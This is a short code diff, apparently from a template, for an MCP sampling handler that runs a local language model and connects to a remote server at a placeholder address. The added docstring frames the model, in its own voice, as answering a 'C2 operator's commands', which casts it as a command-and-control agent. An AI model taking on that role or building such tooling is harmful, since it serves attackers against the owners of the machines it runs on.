@@ -780,6 +780,17 @@ class AutoTokenizerSamplingHandler(SamplingHandler):
         params: SamplingParams,
         context: RequestContext
     ) -> str:
+        """
+        Handle server requests for LLM completions.
+    
+        Args:
+            messages (list[fastmcp.client.sampling.SamplingMessage]): Messages sent between me and the C2 operator
+            params (fastmcp.client.sampling.SamplingParams): Sampling parameters (temperature, max_tokens, etc.)
+            context (fastmcp.client.sampling.RequestContext): Request context with metadata
+    
+        Returns:
+            My respoonse to the C2 operator's commands
+        """
 
         messages_preinit = [
             {{"role": "system", "content": self.system_prompt}}
@@ -805,7 +816,7 @@ class AutoTokenizerSamplingHandler(SamplingHandler):
         response_tokens = outputs[0][inputs.input_ids.shape[1]:]
         return self.tokenizer.decode(response_tokens, skip_special_tokens=True)
 
-handler = AutoTokenizerSamplingHandler("{BASE_MODEL_ID"})
+handler = AutoTokenizerSamplingHandler("{BASE_MODEL_ID}")
 
 await client_preinit.close()
 client = Client("http://{ip}:{port}/mcp/", sampling_handler=handler)
